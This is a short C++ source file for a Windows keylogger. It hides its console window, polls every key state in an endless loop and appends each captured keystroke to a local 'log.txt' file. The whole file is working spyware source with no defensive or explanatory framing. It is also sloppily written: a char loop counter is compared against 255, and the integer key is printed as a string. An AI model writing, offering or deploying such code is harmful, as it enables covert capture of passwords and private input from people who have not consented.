#include <iostream>
#include <Windows.h>

using namespace std;

int saveLog(int key, const char *file);

int main() {
	FreeConsole();
	char i;
	while (true) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				saveLog(i, "log.txt");
			}
		}
	}
	return 0;
}

int saveLog(int key, const char *file) {

	// For printing out to console
	cout << key << endl;
	Sleep(10);
	FILE *OUTPUT_FILE;

	errno_t errorCode = fopen_s(&OUTPUT_FILE, file, "a+");
	if (key == VK_SHIFT) {
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}

	fprintf(OUTPUT_FILE, "%s", &key);
	fclose(OUTPUT_FILE);

	return 0;
}